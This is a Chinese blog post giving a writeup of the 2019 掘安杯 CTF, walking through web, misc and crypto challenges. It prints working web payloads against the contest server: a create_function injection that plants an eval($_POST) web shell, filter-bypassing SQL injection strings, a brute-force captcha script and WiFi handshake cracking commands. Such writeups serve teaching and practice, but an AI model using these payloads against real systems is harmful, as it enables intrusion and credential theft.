<!DOCTYPE html>
<html lang="zh-CN">










<head><meta name="generator" content="Hexo 3.8.0">
    <meta charset="utf-8">
    <link rel="apple-touch-icon" sizes="76x76" href="/apple-touch-icon.png">
    <link rel="icon" type="image/png" href="/favicon.png">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <meta name="description" content="">
    <meta name="author" content="chuddy">
    <meta name="keywords" content="">
    <title>2019掘安杯writeup ~ chuddy&#39;s Blog</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.7.2/css/all.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.7.4/css/mdb.min.css">
    <link rel="stylesheet" href="/css/style.css">
    <link rel="stylesheet" href="https://at.alicdn.com/t/font_1067060_vr10bjtg3us.css">
    
        <link rel="stylesheet" href="/css/Prettify/tomorrow-night-eighties.min.css">
    
</head>

<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
<div class="container">
    <a class="navbar-brand" href="/"><strong>chuddy&#39;s Blog</strong></a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
        <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
        <ul class="navbar-nav ml-auto text-center">
            
            <li class="nav-item">
                <a class="nav-link" href="/">Home</a>
            </li>
            
            <li class="nav-item">
                <a class="nav-link" href="/archives/">Archives</a>
            </li>
            
        </ul>
    </div>
</div>


</nav>
    <div class="view intro-2" style='background: url("/post.jpg")no-repeat center center;background-size: cover;'>
    <div class="full-bg-img">
        <div class="mask rgba-black-light flex-center">
        <div class="container text-center white-text wow fadeInUp">
            <p class="h2">2019掘安杯writeup</p>
            <br>
            
            <p>Wednesday, April 10th 2019, 4:05 pm</p>
            
        </div>
        </div>
    </div>
    </div>
  </header>

  <main>
  
  <div class="container-fluid">
    <div class="row">
        <div class="col-md-8 offset-md-2 ">
            <div class="post-content py-5 z-depth-3 main">
                <h1 id="2019掘安杯writeup"><a href="#2019掘安杯writeup" class="headerlink" title="2019掘安杯writeup"></a>2019掘安杯writeup</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><a id="more"></a>
<h3 id="web签到题"><a href="#web签到题" class="headerlink" title="web签到题"></a>web签到题</h3><p>打开题目链接发现</p>
<p><img src="https://s2.ax1x.com/2019/04/08/A4jPgA.png" alt="image"></p>
<p>点击之后是一个404页面</p>
<p><img src="https://s2.ax1x.com/2019/04/08/A4juCQ.png" alt="image"></p>
<p>果断选择抓包 发现：</p>
<p><img src="https://s2.ax1x.com/2019/04/08/A4j3D0.png" alt="image"></p>
<p>感觉像是base64编码 于是解码获得flag：</p>
<pre><code>jactf{jasafe110qweasdzxc}
</code></pre><h3 id="下载下载"><a href="#下载下载" class="headerlink" title="下载下载"></a>下载下载</h3><p>打开链接发现下载了一个flag.txt  </p>
<p><img src="https://s2.ax1x.com/2019/04/08/A4j7a8.png" alt="image"></p>
<p>于是开始思考别的 查看源代码发现</p>
<pre><code>
&lt;html&gt;
&lt;head&gt;
&lt;title&gt;下载下载&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;a href=&quot;?file=flag.txt&quot;&gt;下载flag文件&lt;/a&gt;
&lt;!-- 
&lt;a href=&quot;flag.php&quot;&gt;flag&lt;/a&gt;
--&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre><p>于是尝试下载flag.php</p>
<pre><code>http://120.79.1.69:10002/?file=flag.php
</code></pre><p>flag.php的内容为一种加密解密的方式</p>
<pre><code>&lt;?php
header(&#39;Content-Type: text/html; charset=utf-8&#39;); //网页编码
function encrypt($data, $key) {
    $key = md5 ( $key );
    $x = 0;
    $len = strlen ( $data );
    $l = strlen ( $key );
    for($i = 0; $i &lt; $len; $i ++) {
        if ($x == $l) {
            $x = 0;
        }
        $char .= $key {$x};
        $x ++;
    }
    for($i = 0; $i &lt; $len; $i ++) {
        $str .= chr ( ord ( $data {$i} ) + (ord ( $char {$i} )) % 256 );
    }
    return base64_encode ( $str );
}

function decrypt($data, $key) {
    $key = md5 ( $key );
    $x = 0;
    $data = base64_decode ( $data );
    $len = strlen ( $data );
    $l = strlen ( $key );
    for($i = 0; $i &lt; $len; $i ++) {
        if ($x == $l) {
            $x = 0;
        }
        $char .= substr ( $key, $x, 1 );
        $x ++;
    }
    for($i = 0; $i &lt; $len; $i ++) {
        if (ord ( substr ( $data, $i, 1 ) ) &lt; ord ( substr ( $char, $i, 1 ) )) {
            $str .= chr ( (ord ( substr ( $data, $i, 1 ) ) + 256) - ord ( substr ( $char, $i, 1 ) ) );
        } else {
            $str .= chr ( ord ( substr ( $data, $i, 1 ) ) - ord ( substr ( $char, $i, 1 ) ) );
        }
    }
    return $str;
}

$key=&quot;MyCTF&quot;;
$flag=&quot;o6lziae0xtaqoqCtmWqcaZuZfrd5pbI=&quot;;//encrypt($flag,$key)
?&gt;
</code></pre><p>只需在代码下面添加</p>
<pre><code>echo decrypt($flag,$key);
</code></pre><p>运行就可以得到flag</p>
<pre><code>myCTF{cssohw456954GUEB}
</code></pre><h3 id="猜密码"><a href="#猜密码" class="headerlink" title="猜密码"></a>猜密码</h3><p>题目暂时下架了</p>
<h3 id="该网站已被黑"><a href="#该网站已被黑" class="headerlink" title="该网站已被黑"></a>该网站已被黑</h3><p>打开页面发现网站被黑</p>
<p><img src="https://s2.ax1x.com/2019/04/08/A4vao8.png" alt="image"></p>
<p>于是用御剑扫到后门 shell.php</p>
<p><img src="https://s2.ax1x.com/2019/04/08/A4vDzj.png" alt="image"></p>
<p>开始爆破管理员密码为  hack<br>即可得到flag</p>
<pre><code>jactf{DWDASFASCASFAFASFNKAS} 
</code></pre><h3 id="not-easy"><a href="#not-easy" class="headerlink" title="not_easy"></a>not_easy</h3><p>发现是个代码审计类的题目：</p>
<pre><code>&lt;?php
error_reporting(0);
if(isset($_GET[&#39;action&#39;])) {
    $action = $_GET[&#39;action&#39;];
}

if(isset($_GET[&#39;action&#39;])){
    $arg = $_GET[&#39;arg&#39;];
}

if(preg_match(&#39;/^[a-z0-9_]*$/isD&#39;, $action)){
    show_source(__FILE__);
} else {
    $action($arg,&#39;&#39;);
}

</code></pre><p>想到了匿名函数绕过 但是他这里有一个正则匹配的问题</p>
<p>看了别人的blog才知道  \可以绕过这个</p>
<p>在PHP的命名空间默认为\，所有的函数和类都在\这个命名空间中，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；而如果写\function_name() 这样调用函数，则其实是写了一个绝对路径。如果你在其他namespace里调用系统类，就必须写绝对路径这种写法。</p>
<p>于是想到绕过方式：</p>
<pre><code>http://120.79.1.69:10006/?action=\create_function&amp;arg=){}phpinfo();/*
</code></pre><p><img src="https://s2.ax1x.com/2019/04/08/A5Qv4S.png" alt="image"></p>
<p>于是可以构造一个木马：</p>
<pre><code>http://120.79.1.69:10006/?action=\create_function&amp;arg=){}eval($_POST[&#39;chuddy&#39;]);/*
</code></pre><p><img src="https://s2.ax1x.com/2019/04/08/A5lPun.png" alt="image"></p>
<p>就可以得到flag：</p>
<pre><code>jactf{c795359da56ae38ec9132eaad24733fc}
</code></pre><h3 id="曲折的人生"><a href="#曲折的人生" class="headerlink" title="曲折的人生"></a>曲折的人生</h3><p>打开页面发现了登陆框 发现可以联合注入</p>
<p><img src="https://s2.ax1x.com/2019/04/08/A530tf.png" alt="image"></p>
<p>通过测试发现过滤了：</p>
<pre><code>空格：用/*1*/绕过
union：双写绕过ununionion
select: 双写绕过selselctect
or：双写绕过oorr
</code></pre><p>于是开始爆值：</p>
<pre><code>爆出username：goodboy_g-60Hellowor  登录的时候要注意，用户名中也存在一个or，所以也要进行双写绕过
admin&#39;ununionion/*1*/selecselectt/*1*/1,(selselectect/*1*/group_concat(username)/*1*/from/*1*/admin),3&#39;#



爆出password为  ajahas&amp;&amp;*44askldajaj
admin&#39;ununionion/*1*/selecselectt/*1*/1,(selselectect/*1*/group_concat(passwoorrd)/*1*/from/*1*/admin),3&#39;#
</code></pre><p>接下来就是下面验证码的问题 需要用脚本来跑</p>
<pre><code>#!/usr/bin/python
#coding=utf-8
import re
import requests
import sys

reload(sys)
sys.setdefaultencoding(&quot;utf8&quot;)
data={
    &#39;username&#39;:&#39;goodboy_g-60Hellowoorr&#39;,
    &#39;password&#39;:&#39;ajahas&amp;&amp;*44askldajaj&#39;
}

for i in range(100000000):
    s = requests.Session()
    url=&quot;http://120.79.1.69:10005/index.php&quot;
    r = s.post(url=url,data=data)
    match = re.search(r&quot;&lt;div class=&#39;rep&#39;&gt;.*&lt;/div&gt;&quot;,r.text).group(0)
    match = str(match)
    match = re.sub(&quot;&lt;div class=&#39;rep&#39;&gt;&quot;,&#39;&#39;,match)
    match = re.sub(&quot;&lt;/div&gt;        &lt;/div&gt;&quot;,&#39;&#39;,match)
    match = re.sub(&quot;（&quot;,&#39;(&#39;,match)
    match = re.sub(&quot;）X&quot;,&#39;)*&#39;,match)
    match = re.sub(&quot;）/&quot;,&#39;)/&#39;,match)
    match = re.sub(&quot;）&quot;,&#39;)&#39;,match)
    match = eval(match)
    print match
    d = {
        &#39;username&#39;:&#39;goodboy_g-60Hellowoorr&#39;,
        &#39;password&#39;:&#39;ajahas&amp;&amp;*44askldajaj&#39;,
        &quot;code&quot;: match
    }
    r = s.post(url=url+&quot;?check&quot;,data=d)
    if &quot;验证码正确&quot; in r.text:
        print r.text
        break
</code></pre><p>跑出来了一个压缩包地址  和密码：</p>
<p><img src="https://s2.ax1x.com/2019/04/08/A5Un2V.png" alt="image"></p>
<p>这里面有获取flag.zip的密码获取方式</p>
<pre><code>Private Function getPassword(ByVal str As String) As String


    Dim reString As String

    Dim i As Integer
    i = 1


    While (i &lt;= Len(str))

     reString = reString &amp; Mid(str, i, 1)
     i = i + (i Mod 5)


    Wend


    getPassword = reString

End Function



Private Sub Command1_Click()

   Dim Dictionary As String

   Dictionary = &quot;VmxSS05HSXhXbkpOV0VwT1YwVmFWRll3Wkc5VVJsbDNWMnhhYkZac1NqQlpNRll3VlRBeFNWRnNjRmRpUmtwSVZsY3hSMk14V2xsalJsSnBVakpvV0ZaR1dsWmxSbHBYWWtSYVZtRjZWbGRVVmxwelRrWmFTR1ZHWkZSaGVrWlhWR3hTVjFZeVJuSlhiRUpYWVRGYVYxcFhlRkprTVZaeVkwZHNVMDFWY0ZkV2JURXdWREZSZUZkcmFGVmlhelZvVlcxNFMxWXhjRlpXVkVaUFlrYzVObGt3VmpCWFJrcHpWbXBTVjFadFVqTldiWE4zWkRKT1IySkdaRmRTVm5CUVZtMTBhMVJyTVVkVmJrcFZZa2RTVDFac1VsZFdNVlY0Vld0a1ZVMXNXbGhXTVdodlZsZEtSMU5yWkZWV1JVVXhWV3hhWVZkSFZraGtSbVJUWWtoQ1JsWnJaRFJWTWtaMFUydG9WbUpHV2xoV01HUnZWVVp3V0UxWGNHeFdhelY2V1ZWYVlWUnNXbkpYYm1oWFlrWktVRlY2Um10U01WcFpZVVpXVjJKRmNIaFdSM1JXVFZVd2QyTkdWbFZoTVZwTVZtdFZNVkpuSlRORUpUTkU=&quot;

   Dim password As String

   password = getPassword(Dictionary)


   Dim psw As String

   psw = Text1.Text


   If (psw = password) Then

    MsgBox &quot;The password is correct!&quot;, vbOKOnly, &quot;密码正确&quot;

    Text1.Text = &quot;Password for next pass : &quot; &amp; getPassword(password)

   Else

    MsgBox &quot;PasswordFail!&quot;, vbOKOnly, &quot;密码错误&quot;


   End If



End Sub

</code></pre><p>写出解密脚本：</p>
<pre><code>str = &quot;VmxSS05HSXhXbkpOV0VwT1YwVmFWRll3Wkc5VVJsbDNWMnhhYkZac1NqQlpNRll3VlRBeFNWRnNjRmRpUmtwSVZsY3hSMk14V2xsalJsSnBVakpvV0ZaR1dsWmxSbHBYWWtSYVZtRjZWbGRVVmxwelRrWmFTR1ZHWkZSaGVrWlhWR3hTVjFZeVJuSlhiRUpYWVRGYVYxcFhlRkprTVZaeVkwZHNVMDFWY0ZkV2JURXdWREZSZUZkcmFGVmlhelZvVlcxNFMxWXhjRlpXVkVaUFlrYzVObGt3VmpCWFJrcHpWbXBTVjFadFVqTldiWE4zWkRKT1IySkdaRmRTVm5CUVZtMTBhMVJyTVVkVmJrcFZZa2RTVDFac1VsZFdNVlY0Vld0a1ZVMXNXbGhXTVdodlZsZEtSMU5yWkZWV1JVVXhWV3hhWVZkSFZraGtSbVJUWWtoQ1JsWnJaRFJWTWtaMFUydG9WbUpHV2xoV01HUnZWVVp3V0UxWGNHeFdhelY2V1ZWYVlWUnNXbkpYYm1oWFlrWktVRlY2Um10U01WcFpZVVpXVjJKRmNIaFdSM1JXVFZVd2QyTkdWbFZoTVZwTVZtdFZNVkpuSlRORUpUTkU&quot;
print len(str)
flag = &quot;&quot;
flag1 = &quot;&quot;
i =1
while i &lt;= len(str):
    flag += str[i-1:i]
    i = i + (i%5)

i=1
while i &lt;= len(flag):
    flag1 += flag[i-1:i]
    i = i + (i%5)
print flag1
</code></pre><p>密码为：<br>VmH0wW3DZalBnmmSalV1SYSGRr1r3jVYcFrHWkUUlhljkFzCbXaEKyaVJymT1FlVTVskVWhGtonaGU2WWGhVXYol1WVI1F2odFuk</p>
<p>解压缩flag.zip之后发现图片打不开，用winhex打开发现flag</p>
<pre><code>flag{Good luck!}
</code></pre><h3 id="audit"><a href="#audit" class="headerlink" title="audit"></a>audit</h3><p>发现是代码审计</p>
<pre><code> &lt;?php
highlight_file(__FILE__);
include(&#39;flag.php&#39;);
$str1 = @$_GET[&#39;str1&#39;];
$str2 = @$_GET[&#39;str2&#39;];
$str3 = @$_GET[&#39;str3&#39;];
$str4 = @$_GET[&#39;str4&#39;];
$str5 = (string)@$_POST[&#39;str5&#39;];
$str6 = (string)@$_POST[&#39;str6&#39;];
$str7 = (string)@$_POST[&#39;str7&#39;];
if( $str1 == $str2 ){
    die(&#39;str1 OR Sstr2 no no no&#39;);
}
if( md5($str1) != md5($str2) ){
    die(&#39;step 1 fail&#39;);
}
if( $str3 == $str4 ){
    die(&#39;str3 OR str4 no no no&#39;);
}
if ( md5($str3) !== md5($str4)){
    die(&#39;step 2 fail&#39;);
}
if( $str5 == $str6 || $str5 == $str7 || $str6 == $str7 ){
    die(&#39;str5 OR str6 OR str7 no no no&#39;);
}
if (md5($str5) !== md5($str6) || md5($str6) !== md5($str7) || md5($str5) !== md5($str7)){
    die(&#39;step 3 fail&#39;);
}

if(!($_POST[&#39;a&#39;]) and !($_POST[&#39;b&#39;]))
{
    echo &quot;come on!&quot;;
    die();
}
$a = $_POST[&#39;a&#39;];
$b = $_POST[&#39;b&#39;];
$m = $_GET[&#39;m&#39;];
$n = $_GET[&#39;n&#39;];

if (!(ctype_upper($a)) || !(is_numeric($b)) || (strlen($b) &gt; 6)) 
{
    echo &quot;a OR b fail!&quot;;
    die();
}

if ((strlen($m) &gt; 4) || (strlen($n) &gt; 4)) 
{
    echo &quot;m OR n fail&quot;;
    die();
}

$str8 = hash(&#39;md5&#39;, $a, false);
$str9 = strtr(hash(&#39;md5&#39;, $b, false), $m, $n);

echo &quot;&lt;p&gt;str8 : $str8&lt;/p&gt;&quot;;
echo &quot;&lt;p&gt;str9 : $str9&lt;/p&gt;&quot;;

if (($str8 == $str9) &amp;&amp; !($a === $b) &amp;&amp; (strlen($b) === 6))
{
    echo &quot;You&#39;re great,give you flag:&quot;;
    echo $flag;
}



str1 OR Sstr2 no no no
</code></pre><p>第一步就是利用弱类型绕过。</p>
<p>第二步就是数组绕过。</p>
<pre><code>str1[]=1&amp;str2[]=2&amp;str3[]=3&amp;str4[]=4就可绕过
</code></pre><p>但是str5,str6,str7强行转为字符串，数组绕过的方法就行不通了<br>只能用MD5强碰撞</p>
<pre><code>str5 = open(&quot;./md5/out_test_000.txt&quot;,&quot;rb&quot;).read()
str6 = open(&quot;./md5/out_test_001.txt&quot;,&quot;rb&quot;).read()
str7 = open(&quot;./md5/out_test_002.txt&quot;,&quot;rb&quot;).read()


工具地址为：https://github.com/thereal1024/python-md5-collision
</code></pre><p>然后就是最后一层的了</p>
<p>需要传递四个参数a,b,m,n<br>$a为大写字母，$b为数字、并且长度为6，$m和$n长度小于4<br>$str8为$ahash加密后的值，$str9为$bhash加密后，把$m替换为$n,<br>要求$str8== $str9。还是用的弱类型。<br>a可以为：QNKCDZO<br>如果$b为hash加密后0e开头，可以满足，长度为6不能满足，但是还有次替换，只需要把0e后不是数字的替换为数字就可以。</p>
<p><img src="https://s2.ax1x.com/2019/04/09/AIdBJs.png" alt="image"></p>
<p>然后开始构造：<br><img src="https://s2.ax1x.com/2019/04/09/AIsueP.png" alt="image"><br>脚本为：</p>
<pre><code>import requests
import sys

reload(sys)
sys.setdefaultencoding(&quot;utf8&quot;)
url = &quot;http://120.79.1.69:10007/?str1[]=1&amp;str2[]=2&amp;str3[]=3&amp;str4[]=4&amp;m=dcb&amp;n=123&quot;

str5 = open(&quot;./md5/out_test_000.txt&quot;,&quot;rb&quot;).read()
str6 = open(&quot;./md5/out_test_001.txt&quot;,&quot;rb&quot;).read()
str7 = open(&quot;./md5/out_test_002.txt&quot;,&quot;rb&quot;).read()

data= {
  &#39;str5&#39;:str5,
  &#39;str6&#39;:str6,
  &#39;str7&#39;:str7,
  &#39;a&#39;:&#39;QNKCDZO&#39;,
  &#39;b&#39;:&#39;259987&#39;
}

s = requests.post(url=url,data=data)
print s.text

</code></pre><p>得到flag：</p>
<pre><code>jactf{c795359da56ae38ec9132eaad24733fc}
</code></pre><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="misc签到"><a href="#misc签到" class="headerlink" title="misc签到"></a>misc签到</h3><p>关注公众号  获得flag</p>
<pre><code>jactf{051bb6f64e70cc8766d62c3ea008eaee}
</code></pre><h3 id="so-easy"><a href="#so-easy" class="headerlink" title="so_easy"></a>so_easy</h3><p>下载下来发现是个打不开的exe文件</p>
<p>于是放在winhex下 发现有点像base加密<br><img src="https://s2.ax1x.com/2019/04/09/AIyN1H.png" alt="image"><br>尝试了一下发现是base58加密 进行解密<br><img src="https://s2.ax1x.com/2019/04/09/AIy0Bt.png" alt="image"><br>发现了像是图片转的base64</p>
<pre><code>data:image/bmp;base64,
</code></pre><p>于是进行在线解密<br><img src="https://s2.ax1x.com/2019/04/09/AIyy4S.png" alt="image"><br>扫描二维码就能得到flag</p>
<pre><code>jactf{base58_base64_flag_very_easy}
</code></pre><h3 id="这是什么玩意"><a href="#这是什么玩意" class="headerlink" title="这是什么玩意"></a>这是什么玩意</h3><p>打开txt文件发现是一些有规律的字符串</p>
<pre><code>=E4=BD=9B=E6=9B=B0=EF=BC=9A=E6=A2=B5=E5=83=A7=E5=A5=A2=E6=A5=9E=E5=A5=A2=E5=90=89=E8=8B=A5=E5=A5=A2=E4=B8=8D=E5=B8=9D=E5=86=A5=E5=A4=9C=E6=98=AF=E7=BC=BD=E6=9C=8B=E7=BC=BD=E7=9C=9F=E7=89=B9=E4=BF=B1=E4=B8=8A=E7=BD=B0=E8=83=BD=E7=9A=A4=E5=AE=A4=E9=98=BF=E8=AB=B3=E6=98=8E=E4=B8=80=E5=88=87=E5=91=90=E9=99=A4=E6=A2=B5=E5=A7=AA=E7=BC=BD=E5=A9=86=E5=91=90=E4=BA=A6=E5=8F=83=E4=BE=84=E5=91=BC=E7=9A=A4=E4=B8=96=E5=93=86=E7=89=B9=E5=93=86=E6=95=85=E5=8B=9D=E8=AB=B3=E7=88=8D=E8=AC=B9=E6=99=BA=E7=9A=A4=E5=8F=83=E5=AD=95=E9=80=9D=E8=AB=B3=E8=AC=B9=E6=BC=AB=E6=AD=BB=E5=8D=B3=E4=BE=84=E9=99=A4=E5=93=86=E9=80=9D=E4=BE=84=E6=98=AF=E5=A5=A2=E5=96=9D=E7=A4=99=E8=B1=86=E8=AB=B3=E6=A5=9E=E7=84=A1=E4=BF=B1=E8=80=85=E5=93=86=E5=BA=A6=E8=80=85=E3=80=82=E8=AB=B3=E7=9C=9F=E5=86=A5=E8=A8=B6=E4=BE=84=E5=8B=9D=E7=AB=9F=E8=97=9D=E5=A5=A2=E4=B8=8D=E4=BC=8A=E7=9A=A4=E8=AC=B9=E6=B6=85=E5=AD=95=E7=84=A1=E4=BB=96=E7=BE=85=E5=A4=A7=E5=BE=97=E9=97=8D=E5=93=86=E5=96=9D=E8=80=B6=E5=83=A7=E7=84=A1=E7=BE=AF=E6=BB=85=E9=99=A4=E5=88=A9=E7=BC=BD=E5=A4=9A=E6=A2=B5=E5=A4=B7=E6=A2=B5=E6=A0=97=E7=BC=BD=E8=80=85=E5=AD=95=E8=AB=B3=E7=9B=A7=E7=9A=A4=E4=B8=89=E7=BD=B0=E5=AF=AB=E8=80=81=E6=A2=B5=E8=80=B6=E5=AE=A4=E5=B8=9D=E6=A2=B5=E5=AF=AB=E7=BE=AF=E6=95=B8=E6=A2=B5=E7=9B=A1=E4=BE=84=E6=A0=97=E4=BE=84=E8=97=90=E4=BF=B1=E4=B8=96=E8=AB=B3=E4=B8=8A=E8=AB=B3=E5=A7=AA=E6=95=B8=E5=AE=A4=E5=A9=86=E7=BD=B0=E6=A7=83=E5=A5=A2=E8=A8=B6=E5=93=86=E5=A4=9A=E9=80=9D=E8=97=90=E9=81=93=E6=A2=B5=E6=A5=9E=E6=A2=B5=E5=8D=97=E4=BE=84=E8=BF=A6=E5=91=90=E7=9F=A5=E6=9C=8B=E6=A5=9E=E4=BE=84=E9=9B=A2=E5=91=90=E6=B2=99=E5=91=90=E6=99=BA=E9=81=AE=E5=A4=A7=E5=AE=A4=E7=A5=9E=E5=86=A5=E8=BC=B8=E6=AE=BF=E7=BC=BD=E6=A7=83=E6=A2=B5=E6=80=9B=E6=81=90=E8=88=8D=E7=9F=A5=E7=9A=A4=E8=BF=A6=E5=A5=A2=E8=88=AC=E8=AB=B3=E7=88=8D=E5=AF=AB=E6=BC=AB=E4=BC=8A=E4=BF=B1=E6=A0=97=E5=93=86=E4=BB=96=E4=BA=A6=E7=BC=BD=E6=A5=9E=E6=80=9B=E5=86=A5=E5=91=BC=E5=88=87=E4=BF=B1=E8=8F=A9=E8=88=8D=E5=91=90=E5=AF=A6=E6=A0=97=E5=A5=A2=E6=B3=A2=E6=91=A9=E8=AB=B3=E9=81=93=E7=BC=BD=E7=91=9F=E5=93=86=E5=AF=A6=E7=9A=A4=E7=88=8D=E5=8B=9D=E8=96=A9=E7=BD=B0=E8=AB=B8=E5=A5=A2=E8=88=AC=E8=AB=A6=E7=BD=B0=E6=98=8E=E7=BC=BD=E8=AB=A6=E5=B0=BC=E5=93=86=E6=A5=9E=E4=BD=9B=E4=BF=B1=E9=86=AF=E8=AB=B3=E6=BB=85=E5=BA=A6=E5=93=86=E6=89=80=E6=A7=83=E5=A7=AA=E9=BA=BC=E6=89=80=E6=81=90=E8=AB=B3=E4=BB=96=E4=BE=84=E5=AF=AB=E7=91=9F=E4=BE=84=E6=89=80=E5=BE=97=E9=9A=B8=E5=93=86=E9=97=8D=E5=91=90=E6=8F=90=E7=9B=A7=E5=86=A5=E5=92=92=E5=A5=A2=E6=9B=B0=E5=91=90=E6=B2=99=E6=80=AF=E8=88=AC=E5=8D=97=E6=80=AF=E5=9C=B0=E7=BC=BD=E5=96=9D=E5=86=A5=E6=83=B3=E5=91=90=E7=9B=A7=E7=BD=B0=E8=AC=B9=E5=91=BC=E8=B7=8B=E7=BC=BD=E4=B8=8A=E5=A8=91=E8=AB=A6=E6=AD=BB=E4=BE=84=E8=BF=A6
</code></pre><p>百度一波发现是   Quoted-printable编码  开始解码</p>
<p><img src="https://s2.ax1x.com/2019/04/09/AIcBY8.png" alt="image"></p>
<p>解码获得一个佛曰  于是想到了  与佛论禅</p>
<p><img src="https://s2.ax1x.com/2019/04/09/AIcylQ.png" alt="image"></p>
<p>社会主义核心价值观编码  解码获得flag</p>
<p><img src="https://s2.ax1x.com/2019/04/09/AIc2mn.png" alt="image"></p>
<p>flag为：</p>
<pre><code>jactf{hexin_yufo_qp}
</code></pre><h3 id="你对我的网站做了什么"><a href="#你对我的网站做了什么" class="headerlink" title="你对我的网站做了什么"></a>你对我的网站做了什么</h3><p>这是一个流量包分析题，打开流量包直接追踪数据流</p>
<p>发现了php代码  关于一种加密方式</p>
<p><img src="https://s2.ax1x.com/2019/04/09/AIoCjK.png" alt="image"></p>
<p>还有一个和flag有关的数据流</p>
<p><img src="https://s2.ax1x.com/2019/04/09/AIokHe.png" alt="image"></p>
<p>分析可知是通过对flag.txt的内容进行加密 绕后输出的</p>
<p>于是写出解密的方法</p>
<pre><code>&lt;?php
$str = &quot;eJxLy0lMrw6NTzPMS4n3TVWsBQAz4wXi&quot;;
echo gzuncompress(base64_decode($str, 6));

?&gt;
</code></pre><p>得到flag：</p>
<pre><code>flag{U_f1nd_Me!}
</code></pre><h3 id="小梳子"><a href="#小梳子" class="headerlink" title="小梳子"></a>小梳子</h3><p>题目叫我们破解wifi密码，已知wifi密码是手机号，前六位是138364，那么就很好办，我们可以自己做一个字典，直接爆破就得到了。</p>
<p>首先使用kali工具生成我们想要的字典</p>
<pre><code>crunch 11 11 -t 138364%%%%% -o/root/chuddy/test.txt

解析：11代表字典最小和最大位都是11位，%代表数字，-o为输出路径
</code></pre><p><img src="https://s2.ax1x.com/2019/04/09/AIbxln.png" alt="image"></p>
<p>然后开始爆破这个wifi</p>
<pre><code>aircrack-ng -w /root/chuddy/test.txt Tenda_D07D90-01.cap
</code></pre><p><img src="https://s2.ax1x.com/2019/04/09/AIq9mV.png" alt="image"></p>
<p>输入对应的编号：1，然后就是开始爆破</p>
<p><img src="https://s2.ax1x.com/2019/04/09/AIqPTU.png" alt="image"></p>
<p>得到flag：</p>
<pre><code>jactf{13836458932}
</code></pre><h3 id="这不是真的图片"><a href="#这不是真的图片" class="headerlink" title="这不是真的图片"></a>这不是真的图片</h3><p>打开是一个图片  分析无果</p>
<p>binwalk一下  发现里面有一个压缩包</p>
<p><a href="https://imgchr.com/i/AIzkbn" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/04/09/AIzkbn.md.png" alt="AIzkbn.md.png"></a></p>
<p>但是foremost却不能分离出来</p>
<p>winhex打开文件  查找 14000000</p>
<p>发现压缩包的头  被改为了  ja66  </p>
<p><a href="https://imgchr.com/i/AIzVU0" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/04/09/AIzVU0.md.png" alt="AIzVU0.md.png"></a></p>
<p>改回之后  再进行分离  打开压缩包  发现需要输入密码</p>
<p>尝试ja66  打开了</p>
<p>发现好多个文件夹 每个文件夹里面都有一个字母  </p>
<p>有这些字母组成flag</p>
<p>编写脚本</p>
<pre><code>import base64
flag=&#39;&#39;
for i in range(32):
    f=open(&#39;./subject/&#39;+str(i)+&#39;/&#39;+str(i)+&#39;.txt&#39;,&#39;r&#39;)
    flag+=f.read()
print flag
print base64.b64decode(flag)
</code></pre><p>得到flag：</p>
<pre><code>jactf{64se64_1s_50_c001}
</code></pre><h3 id="该死的温柔"><a href="#该死的温柔" class="headerlink" title="该死的温柔"></a>该死的温柔</h3><p>这道题就是使用了隐写工具OutGuess，它是一种通用的隐写工具，可以插入将隐藏信息存入数据源的冗余位。</p>
<p>安装工具<br>kali终端命令：</p>
<pre><code>git clone https://github.com/crorvick/outguess

下载之后双击打开文件夹 输入命令

./configure&amp;&amp; make &amp;&amp; make install

即可安装成功
</code></pre><p>查看这个图片的属性，发现备注有个guess</p>
<p>这就是要工具解密的密码<br>然后构造命令</p>
<pre><code>root@kali:~/chuddy/ctf/jactf/# outguess -k &quot;guess&quot; -r flag.jpg chuddy.txt
Reading flag.jpg....
Extracting usable bits:   11538 bits
Steg retrieve: seed: 206, len: 33

</code></pre><p>得到flag</p>
<pre><code>jactf{jactf_guess_steganography}

</code></pre><h3 id="怀疑人生"><a href="#怀疑人生" class="headerlink" title="怀疑人生"></a>怀疑人生</h3><p>打开发现是三个文件</p>
<p>第一个文件是一个压缩包 需要密码才能打开</p>
<p>于是想到用工具去跑  跑出来密码为 password</p>
<p>打开发现时一串字母  用base64解码得到第一部分的flag</p>
<pre><code>flag{hacker
</code></pre><p>第二个文件是一个图片<br>使用binwalk分析这个图片  发现隐藏的压缩包</p>
<p>foremost分离 打开压缩包 发现需要密码</p>
<p>用winhex打开发现时压缩包伪加密</p>
<p>把全局伪加密 01 00 ，改为00 00后保存  解压得到了一个txt文件</p>
<p>打开后发现是有  .?!组成的</p>
<p>想到了ook解密  <a href="https://www.splitbrain.org/services/ook" target="_blank" rel="noopener">ook解密</a></p>
<p>解密获得字符串  </p>
<pre><code>3oD54e
</code></pre><p>用base58解密获得第二部分的flag</p>
<pre><code>misc
</code></pre><p>第三个文件像是一个二维码</p>
<p>使用二维码识别工具进行识别</p>
<p>得到最后一部分的flag</p>
<pre><code>12580}
</code></pre><p>三部分拼接在一起结构成了flag</p>
<pre><code>flag{hackermisc12580}
</code></pre><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><p>发现了一串字符串  像十六进制</p>
<pre><code>#coding:utf-8
import binascii

str = &quot;6A616374667B6865785F69735F656173797D&quot;
print binascii.a2b_hex(str)
